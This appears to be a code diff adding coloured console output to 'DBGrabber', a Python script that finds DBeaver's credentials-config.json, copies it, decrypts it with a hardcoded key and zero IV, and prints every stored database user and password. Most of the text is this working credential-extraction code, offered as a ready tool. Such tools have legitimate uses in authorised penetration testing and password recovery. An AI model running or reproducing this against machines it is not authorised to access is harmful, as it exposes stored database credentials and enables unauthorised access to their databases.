@@ -6,15 +6,19 @@ import json
 import re
 from pathlib import Path
 import psutil
+from colorama import init, Fore, Style
+
+# Initialize colorama
+init(autoreset=True)
 
 
 def find_credentials_file(username):
     """Find the credentials-config.json file based on the OS."""
     system = platform.system()
-    print(f"[INFO] Detected Operating System: {system}")
+    print(Fore.CYAN + f"[INFO] Detected Operating System: {system}")
     if system == "Windows":
         drives = [partition.device for partition in psutil.disk_partitions()]
-        print(f'[INFO] Drives detected: {drives}')
+        print(Fore.CYAN + f'[INFO] Drives detected: {drives}')
         for drive in drives:
             file_path = Path(
                 drive) / f'Users/{username}/AppData/Roaming/DBeaverData/workspace6/General/.dbeaver/credentials-config.json'
@@ -56,44 +60,51 @@ def decrypt_file(encryption_key, initialization_vector, input_file, output_file)
 
 
 def main():
-    print("======================================================")
-    print("                    DBGrabber v1.0")
-    print("======================================================")
-    print("This script is intended for Windows, Linux, and macOS Machines.")
+    print(Fore.CYAN + Style.BRIGHT + r"""
+     ____  ____           _     _               
+    |  _ \| __ )  ___  __| | __| | ___ _ __ ___ 
+    | | | |  _ \ / _ \/ _` |/ _` |/ _ \ '__/ __|
+    | |_| | |_) |  __/ (_| | (_| |  __/ |  \__ \
+    |____/|____/ \___|\__,_|\__,_|\___|_|  |___/
+    """)
+    print(Style.BRIGHT + "======================================================")
+    print(Fore.GREEN + Style.BRIGHT + "                    DBGrabber v1.0")
+    print(Style.BRIGHT + "======================================================")
+    print(Fore.YELLOW + "This script is intended for Windows, Linux, and macOS Machines.")
     print("It fetches and decrypts DBeaver credentials.")
-    print("------------------------------------------------------")
+    print(Style.BRIGHT + "------------------------------------------------------")
 
     encryption_key = "babb4a9f774ab853c96c2d653dfe544a"
     initialization_vector = "00000000000000000000000000000000"
 
     username = os.getlogin()
-    print(f"[INFO] Detected username: {username}")
+    print(Fore.CYAN + f"[INFO] Detected username: {username}")
 
-    print(f"[INFO] Searching for credentials file for user: {username}")
+    print(Fore.CYAN + f"[INFO] Searching for credentials file for user: {username}")
     file_path = find_credentials_file(username)
     if file_path:
-        print(f"[INFO] Credentials file found at: {file_path}")
+        print(Fore.GREEN + f"[INFO] Credentials file found at: {file_path}")
     else:
-        print("[ERROR] Credentials file not found.")
+        print(Fore.RED + "[ERROR] Credentials file not found.")
 
     if file_path:
-        print(f"[INFO] User profile found on drive: {file_path.drive}")
-        print(f"[INFO] Looking for file at: {file_path}")
+        print(Fore.CYAN + f"[INFO] User profile found on drive: {file_path.drive}")
+        print(Fore.CYAN + f"[INFO] Looking for file at: {file_path}")
 
         # Copy the file to the current directory
         destination = Path('./credentials-config.json')
         shutil.copy(file_path, destination)
-        print("[SUCCESS] File copied successfully.")
+        print(Fore.GREEN + "[SUCCESS] File copied successfully.")
 
         # Decrypt the file
         output_file = Path('./decrypted-output.txt')
         returncode, stderr = decrypt_file(encryption_key, initialization_vector, destination, output_file)
 
         if returncode == 0 and output_file.exists():
-            print("[SUCCESS] Decryption completed successfully.")
-            print("------------------------------------------------------")
-            print("Decrypted Content:")
-            print("------------------------------------------------------")
+            print(Fore.GREEN + "[SUCCESS] Decryption completed successfully.")
+            print(Style.BRIGHT + "------------------------------------------------------")
+            print(Fore.YELLOW + "Decrypted Content:")
+            print(Style.BRIGHT + "------------------------------------------------------")
             with output_file.open('r') as file:
                 content = file.read()
                 # Extract JSON part using regex
@@ -104,19 +115,19 @@ def main():
                     for db, details in credentials.items():
                         user = details['#connection']['user']
                         password = details['#connection']['password']
-                        print(f"Database: {db}, User: {user}, Password: {password}")
+                        print(Fore.CYAN + f"Database: {db}, User: {user}, Password: {password}")
                 else:
-                    print("[ERROR] JSON content not found in the decrypted output.")
-            print("------------------------------------------------------")
+                    print(Fore.RED + "[ERROR] JSON content not found in the decrypted output.")
+            print(Style.BRIGHT + "------------------------------------------------------")
         else:
-            print("[ERROR] Decryption failed.")
+            print(Fore.RED + "[ERROR] Decryption failed.")
             print(stderr)
     else:
-        print("[ERROR] User profile drive not found. Please check the configuration.")
+        print(Fore.RED + "[ERROR] User profile drive not found. Please check the configuration.")
 
-    print("======================================================")
-    print("                       End of DBGrabber")
-    print("======================================================")
+    print(Style.BRIGHT + "======================================================")
+    print(Fore.GREEN + "                       End of DBGrabber")
+    print(Style.BRIGHT + "======================================================")
 
 
 if __name__ == "__main__":
